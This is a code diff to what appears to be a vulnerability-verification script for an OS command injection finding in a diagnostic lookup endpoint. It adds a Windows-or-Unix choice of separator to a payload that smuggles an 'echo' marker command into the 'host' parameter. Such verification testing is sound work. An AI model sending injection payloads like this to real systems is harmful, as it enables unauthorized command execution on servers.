@@ -11,6 +11,7 @@ specific path.
 """
 import requests
 import secrets
+import platform
 
 FINDING_ID = "F-03"
 TITLE = "OS Command Injection in Diagnostic Lookup Endpoint"
@@ -30,7 +31,8 @@ def attack(base_url: str = "http://localhost:8001") -> dict:
     }
 
     marker = f"SENTINEL_CMDI_{secrets.token_hex(4)}"
-    payload = f"127.0.0.1; echo {marker}"
+    separator = "&" if platform.system() == "Windows" else ";"
+    payload = f"127.0.0.1{separator} echo {marker}"
 
     try:
         r = requests.get(f"{base_url}/lookup", params={"host": payload}, timeout=5)
